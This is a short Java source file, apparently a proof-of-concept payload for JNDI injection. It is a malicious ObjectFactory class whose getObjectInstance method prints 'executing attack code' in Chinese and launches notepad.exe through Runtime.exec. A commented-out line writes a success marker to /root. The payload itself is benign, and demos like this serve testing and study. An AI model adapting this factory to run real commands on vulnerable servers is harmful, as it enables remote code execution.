import javax.naming.Context;
import javax.naming.Name;
import java.io.IOException;
import java.util.Hashtable;

public class test implements javax.naming.spi.ObjectFactory{

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("执行攻击代码。。。。");
        Process pro = Runtime.getRuntime().exec("notepad.exe");
//        Process pro = Runtime.getRuntime().exec("echo 'jndi success!' > /root/RegistryServer.txt");
        return null;
    }

    public static void main(String[] args) throws IOException {
        Process pro = Runtime.getRuntime().exec("notepad.exe");
    }
}
